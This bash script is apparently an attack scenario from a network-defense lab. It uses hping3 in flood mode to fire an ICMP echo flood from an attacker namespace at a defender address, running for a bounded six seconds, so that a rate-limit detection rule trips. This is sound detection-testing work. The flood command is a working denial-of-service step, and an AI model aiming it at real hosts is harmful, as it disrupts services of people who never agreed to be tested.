#!/usr/bin/env bash
# ==============================================================================
# attack/scenarios/icmp_flood.sh
# ICMP (ping) flood from the attacker namespace -> 'dos_flood' family -> R-DOS
# (recommend). hping3 blasts ICMP echo requests at the defender; the volume
# trips the rate-rule flood branch. Requires root, a running lab
# (sudo defend/setup_netns.sh), and hping3 (sudo attack/setup.sh).
#
#   sudo attack/scenarios/icmp_flood.sh
#
# Env overrides: DURATION (seconds, default 6).
# ==============================================================================
set -uo pipefail
cd "$(dirname "$0")/../.."
# shellcheck disable=SC1091
source ./defend/lab.env

DURATION="${DURATION:-6}"

if ! command -v hping3 >/dev/null 2>&1; then
    echo "[-] hping3 not found. Install it first: sudo attack/setup.sh" >&2
    exit 1
fi

echo "[attack] ICMP flood $ATTACKER_LAB_IP -> $DEFENDER_LAB_IP (single flow, ~${DURATION}s)"
# -1 = ICMP mode, --flood = as fast as possible; timeout bounds the burst.
timeout "$DURATION" attack/run.sh \
    hping3 -1 --flood "$DEFENDER_LAB_IP" || true
echo "[attack] ICMP flood complete"
